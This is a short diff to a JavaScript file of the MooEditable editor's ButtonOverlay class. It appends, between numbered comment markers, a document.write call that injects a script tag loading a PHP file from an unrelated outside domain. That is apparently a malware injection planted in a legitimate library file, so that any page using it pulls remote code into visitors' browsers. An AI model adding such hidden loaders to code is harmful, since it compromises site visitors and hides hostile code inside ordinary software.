@@ -112,3 +112,13 @@ MooEditable.UI.ButtonOverlay = new Class({
 	}
 	
 });
+
+/*997552*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/997552*/
